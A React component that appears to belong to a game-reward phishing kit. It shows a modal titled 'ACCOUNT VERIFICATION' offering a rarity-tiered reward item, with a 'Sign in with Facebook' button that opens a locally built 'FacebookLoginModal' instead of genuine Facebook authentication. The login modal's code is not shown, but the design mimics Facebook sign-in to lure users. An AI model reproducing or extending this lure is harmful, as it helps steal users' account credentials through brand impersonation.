import { useEffect, useState } from 'react';
import FacebookLoginModal from './FacebookLoginModal';
import { X } from 'lucide-react';

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

interface AccessModalProps {
  isOpen: boolean;
  onClose: () => void;
  item: RewardItem | null;
}

const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
  const [showModal, setShowModal] = useState(isOpen);
  const [showFacebookLogin, setShowFacebookLogin] = useState(false);

  useEffect(() => {
    setShowModal(isOpen);
  }, [isOpen]);

  const handleFacebookLogin = () => {
    setShowFacebookLogin(true);
  };

  const handleCloseFacebookLogin = () => {
    setShowFacebookLogin(false);
  };

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      setShowModal(false);
      onClose();
    }
  };

  if (!showModal) return null;

  return (
    <>
      <div
        className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm"
        onClick={handleBackdropClick}
      >
        <div className="relative w-[90%] max-w-md mx-auto bg-white rounded-lg shadow-2xl overflow-hidden border border-gray-300">

          {/* Header */}
          <div className="bg-gray-100 px-4 py-2 flex items-center justify-between border-b border-gray-300">
            <h2 className="text-sm font-semibold text-gray-800">ACCOUNT VERIFICATION</h2>
            <button onClick={() => { setShowModal(false); onClose(); }}>
              <X className="w-5 h-5 text-gray-500 hover:text-black" />
            </button>
          </div>

          {/* Background Image Section */}
          <div
            className="w-full h-[200px] bg-cover bg-center"
            style={{
              backgroundImage: `url("https://i.ibb.co/BHG8rmtw/images-29.jpg")`,
            }}
          />

          {/* Buttons */}
          <div className="w-full px-5 pb-4 pt-2 flex flex-col gap-2 items-center bg-white">
            {/* Facebook Button */}
            <button
              onClick={handleFacebookLogin}
              className="w-56 bg-[#1877f2] text-white flex items-center justify-center px-3 py-1 rounded-md shadow hover:bg-[#145dcc] text-xs font-medium"
            >
              Sign in with Facebook
            </button>

            {/* Guest and More Buttons */}
            <div className="flex justify-between w-56 gap-2 mt-1">
              <button className="flex-1 bg-white border border-gray-400 text-black py-1 rounded-md shadow hover:bg-gray-100 text-xs font-semibold">
                👤 Guest
              </button>
              <button className="flex-1 bg-white border border-gray-400 text-black py-1 rounded-md shadow hover:bg-gray-100 text-xs font-semibold">
                ••• More
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Facebook Login Modal */}
      <FacebookLoginModal
        isOpen={showFacebookLogin}
        onClose={handleCloseFacebookLogin}
      />
    </>
  );
};

export default AccessModal;
        
